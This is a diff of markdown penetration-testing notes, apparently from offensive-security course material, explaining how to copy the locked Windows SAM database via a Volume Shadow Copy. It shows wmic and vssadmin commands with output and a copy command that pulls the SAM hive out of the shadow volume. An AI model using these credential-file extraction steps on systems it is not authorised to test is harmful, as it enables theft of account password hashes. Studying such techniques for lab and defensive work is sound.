@@ -17,13 +17,20 @@ S-R-X-Y1-Y2-Yn-1-Yn
 ```
 
 #### Copy SAM
+we’ll attempt to obtain credentials for this user account from the SAM database. The SAM is
+located at C:\Windows\System32\config\SAM, but the SYSTEM process has an exclusive lock on
+it, preventing us from reading or copying it even from an administrative command prompt:
 
-We can use Volume Shadow Copy Server to create a snapshot of the lical hard drive. And copy the sam from local hard drive.
+we’ll launch wmic, specify the shadowcopy class, create a new shadow volume and
+specify the source drive with “Volume=‘C:\’”. This will create a snapshot of the C drive. 
 
-Create a snapshot, and verify with vssadmin
 ```
 C:\> wmic shadowcopy call create Volume='C:\'
+```
 
+To verify this, we’ll run vssadmin and list the existing shadow volumes with list shadows
+
+```
 C:\> vssadmin list shadows
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 (C) Copyright 2001-2013 Microsoft Corp.
@@ -34,7 +41,12 @@ Original Volume: (C:)\\?\Volume{a74776de-f90e-4e66-bbeb-1e507d7fa0d4}\
 Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
 ```
 
-Copy sam databsae from shadows, and copy the encryption keys from system file(neeed to create s shadow copy first)
+Now that we’ve confirmed the creation of the shadow volume, we can copy the SAM database
+from it using the source path.
+
+Now we have the SAM database, it is partially encrypted by either RC4 AES. The encryption keys are stored in 
+the SYSTEM file, which is in the same folder as the SAM
+database. However, it is also locked by the SYSTEM account.
 ```
 C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
 
